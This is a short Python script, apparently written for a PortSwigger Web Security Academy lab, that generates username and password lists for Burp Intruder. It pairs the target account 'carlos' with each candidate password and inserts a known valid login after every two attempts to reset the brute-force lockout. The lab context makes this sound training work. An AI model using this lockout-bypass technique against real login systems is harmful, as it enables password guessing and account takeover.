# First of all past the passwords that portswigger gave us in new passwords.txt file in the same directory
## as this python script

# Opening The password credntioals file that portswigger gave us
original_passwords = open("passwords.txt", "r").read().splitlines()

# Open new files that will have our new passwords and usernames that will bypass the WAF
user_file = open("new_usernames.txt", "w")
pass_file = open("new_passwords.txt", "w")

count = 0

# Loop through each password in the password Credntioals.
for pwd in original_passwords:
    # Write the target attempt
    user_file.write("carlos\n")
    pass_file.write(pwd + "\n")
    count = count + 1
    
    # Every 2 attempts, write the reset attempt
    if count % 2 == 0:
        user_file.write("wiener\n")
        pass_file.write("peter\n")

# Close the files :)
user_file.close()
pass_file.close()

print("=================================================\n")
print("Done! Files are ready u can past them in Intruder.\n")
print("==================================================\n")

#kaliman 
